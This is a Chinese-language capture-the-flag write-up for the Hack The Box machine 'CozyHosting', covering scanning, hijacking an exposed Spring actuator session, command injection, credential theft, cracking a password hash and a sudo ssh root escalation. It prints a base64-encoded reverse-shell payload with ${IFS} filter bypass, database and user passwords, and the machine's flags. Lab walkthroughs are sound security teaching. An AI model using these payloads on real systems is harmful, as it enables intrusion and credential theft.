# HTB-CozyHosting
> Ｏ翰 & Ｏ東

先用nmap進行端口掃描，發現開啟port 22及80，
訪問port 80的網站，看看是否有進入點可以利用
```
PS C:\> nmap --unprivileged  -A 10.10.11.230
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-06 20:13 台北標準時間
Nmap scan report for 10.10.11.230
Host is up (0.21s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.66 seconds
```
![image](https://hackmd.io/_uploads/HJFR_yAHp.png)



 使用目錄爆破工具dirsearch，確認是否有其他進入點
```
┌──(kali㉿kali)-[~/dirsearch]
└─$ python dirsearch.py -u http://cozyhosting.htb/     
/home/kali/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11715

Output: /home/kali/dirsearch/reports/http_cozyhosting.htb/__23-12-12_09-51-06.txt

Target: http://cozyhosting.htb/

[09:51:06] Starting: 
[#                   ]  6%    769/11715        68/s       job:1/1  errors:0^[[#                   ]  6%    769/11715        68/s       job:1/1  errors:0^[[#                   ]  6%    776/11715        66/s       job:1/1  errors:0^[[#                   ]  6%    815/11715        73/s       job:1/1  errors:0^[[#                   ]  7%    821/11715        73/s       job:1/1  errors:0^[[#                   ]  7%    821/11715        73/s       job:1/1  errors:0^[[#                   ]  7%    904/11715        66/s       job:1/1  errors:0^[[09:51:41] 200 -    0B  - /;/json                                           
[09:51:41] 200 -    0B  - /;/login
[09:51:41] 200 -    0B  - /;admin/
[09:51:41] 200 -    0B  - /;json/
[09:51:41] 200 -    0B  - /;login/
[09:51:41] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[09:51:41] 200 -    0B  - /;/admin                                          
[09:51:45] 400 -  435B  - /a%5c.aspx                                        
[09:51:48] 200 -  634B  - /actuator                                         
[09:51:48] 200 -    0B  - /actuator/;/auditLog
[09:51:48] 200 -    0B  - /actuator/;/conditions
[09:51:48] 200 -    0B  - /actuator/;/configprops
[09:51:48] 200 -    0B  - /actuator/;/configurationMetadata
[09:51:48] 200 -    0B  - /actuator/;/dump
[09:51:48] 200 -    0B  - /actuator/;/caches
[09:51:48] 200 -    0B  - /actuator/;/beans
[09:51:48] 200 -    0B  - /actuator/;/flyway
[09:51:48] 200 -    0B  - /actuator/;/exportRegisteredServices
[09:51:48] 200 -    0B  - /actuator/;/heapdump
[09:51:48] 200 -    0B  - /actuator/;/auditevents
[09:51:48] 200 -    0B  - /actuator/;/env
[09:51:48] 200 -    0B  - /actuator/;/info
[09:51:48] 200 -    0B  - /actuator/;/features
[09:51:48] 200 -    0B  - /actuator/;/events
[09:51:48] 200 -    0B  - /actuator/;/health
[09:51:48] 200 -    0B  - /actuator/;/loggers
[09:51:48] 200 -    0B  - /actuator/;/logfile
[09:51:48] 200 -    0B  - /actuator/;/httptrace
[09:51:48] 200 -    0B  - /actuator/;/mappings
[09:51:48] 200 -    0B  - /actuator/;/integrationgraph
[09:51:48] 200 -    0B  - /actuator/;/liquibase
[09:51:48] 200 -    0B  - /actuator/;/metrics
[09:51:48] 200 -    0B  - /actuator/;/jolokia
[09:51:49] 200 -    0B  - /actuator/;/prometheus
[09:51:49] 200 -    0B  - /actuator/;/refresh
[09:51:49] 200 -    0B  - /actuator/;/releaseAttributes
[09:51:49] 200 -    0B  - /actuator/;/trace
[09:51:48] 200 -    0B  - /actuator/;/loggingConfig
[09:51:49] 200 -    0B  - /actuator/;/sessions
[09:51:49] 200 -    0B  - /actuator/;/springWebflow
[09:51:49] 200 -    0B  - /actuator/;/sso
[09:51:49] 200 -    0B  - /actuator/;/registeredServices
[09:51:49] 200 -    0B  - /actuator/;/ssoSessions
[09:51:49] 200 -    0B  - /actuator/;/threaddump
[09:51:49] 200 -    0B  - /actuator/;/status
[09:51:49] 200 -    0B  - /actuator/;/scheduledtasks                        
[09:51:49] 200 -    0B  - /actuator/;/resolveAttributes                     
[09:51:48] 200 -    0B  - /actuator/;/healthcheck
[09:51:49] 200 -    0B  - /actuator/;/statistics
[09:51:49] 200 -    0B  - /actuator/;/shutdown
[09:51:50] 200 -   15B  - /actuator/health                                  
[09:51:50] 200 -    5KB - /actuator/env                                     
[09:51:50] 200 -   98B  - /actuator/sessions                                
[09:51:51] 200 -   10KB - /actuator/mappings                                
[09:51:53] 200 -  124KB - /actuator/beans                                   
[09:51:54] 401 -   97B  - /admin                                            
[09:51:56] 200 -    0B  - /admin/%3bindex/                                  
[09:52:00] 200 -    0B  - /Admin;/              
```
![image](https://hackmd.io/_uploads/rywT4lIU6.png)
+ 掃描後的結果
![image](https://hackmd.io/_uploads/Syx-OeIIa.png)
+ 因為後面都是先進actuator裡再到其他分頁，選擇進入actuator在進入actuator後看到的畫面
![image](https://hackmd.io/_uploads/S1kxteIIT.png)
+ 進入sessions會看到有一個叫"kanderson"的



![image](https://hackmd.io/_uploads/HylYRg8Up.png)



![image](https://hackmd.io/_uploads/Sy1UtyAST.png)


![image](https://hackmd.io/_uploads/H1aDtkCHp.png)


![image](https://hackmd.io/_uploads/By09tyCSp.png)


推測存在命令注入漏洞，使用[Reverse Shell Generator](https://www.revshells.com/)生成reverse shell，送出後結果返回不能使用空格
![image](https://hackmd.io/_uploads/r1fIVl8Up.png)


![image](https://hackmd.io/_uploads/rJk24xII6.png)


嘗試使用base64編碼，繞過過濾，成功返回reverse shell
```
sh -i >& /dev/tcp/10.10.16.69/9999 0>&1

c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNjkvOTk5OSAwPiYxCgo=

;`echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNjkvOTk5OSAwPiYxCgo="|base64${IFS}-d|bash;`
```
![image](https://hackmd.io/_uploads/HyH0wlIUa.png)

![image](https://hackmd.io/_uploads/HkuLdlULp.png)

輸入指令ls，會在當前目錄下發現一個jar檔案，使用python架一個簡易網頁伺服器，取回檔案
```
python3 -m http.server 9090
```
![image](https://hackmd.io/_uploads/ryTtFeUIa.png)
![image](https://hackmd.io/_uploads/BkMwqgLU6.png)


使用jd-gui反編譯java
![image](https://hackmd.io/_uploads/SJKX3l88a.png)

可從`application/properties`中找到`postgres`的帳密
![image](https://hackmd.io/_uploads/SkP_nlUUa.png)
```
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

可從`scheduled/FakeUser.class`中找到`kanderson`的帳密
![image](https://hackmd.io/_uploads/SJsOpeUU6.png)
```
package BOOT-INF.classes.htb.cloudhosting.scheduled;

import java.io.IOException;
import java.util.concurrent.TimeUnit;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

@Component
public class FakeUser {
  @Scheduled(timeUnit = TimeUnit.MINUTES, fixedDelay = 5L)
  public void login() throws IOException {
    System.out.println("Logging in user ...");
    Runtime.getRuntime().exec(new String[] { "curl", "localhost:8080/login", "--request", "POST", "--header", "Content-Type: application/x-www-form-urlencoded", "--data-raw", "username=kanderson&password=MRdEQuv6~6P9", "-v" });
  }
}
```


使用psql連接資料庫
```
$ psql -h 127.0.0.1 -U postgres
Password for user postgres: Vg&nvzAQ7XxR


\c cozyhosting
You are now connected to database "cozyhosting" as user "postgres".
\d
              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
(3 rows)

select * from users
;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

使用john the ripper 爆破hash取得密碼明文:`manchesterunited`
```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' > hash
                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --rules hash 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)     
1g 0:00:00:35 DONE (2023-12-12 10:57) 0.02796g/s 78.52p/s 78.52c/s 78.52C/s catcat..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```


查看home目錄使用者名稱:`josh`，並使用如下指令取得該使用者權限
```
$ ls -al /home
total 12
drwxr-xr-x  3 root root 4096 May 18  2023 .
drwxr-xr-x 19 root root 4096 Aug 14 14:11 ..
drwxr-x---  5 josh josh 4096 Dec 12 14:48 josh'

$ su josh
Password: manchesterunited
ls
cloudhosting-0.0.1.jar
whoami
josh
ls
cloudhosting-0.0.1.jar
cd /home
ls
josh
cd josh
ls
enum.output
enum.sh
linpeas.output
linpeas.sh
user.txt
cat user.txt
3a4fd43608bb80e633abc785ce61fe1d
```

嘗試使用`sudo -l`提升權限至`root`，但提示`josh`只能用`root`執行`ssh`指令
```
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
id
uid=1003(josh) gid=1003(josh) groups=1003(josh)
sudo -l -S
[sudo] password for josh: manchesterunited
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

最後，依照 https://gtfobins.github.io/gtfobins/ssh/#sudo 的方法提升權限至`root`，取得最終flag
```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
Pseudo-terminal will not be allocated because stdin is not a terminal.
id
uid=0(root) gid=0(root) groups=0(root)

cd /root
ls
root.txt
cat root.txt
316f5f539f2e128c63e149211b9c5c5d
```
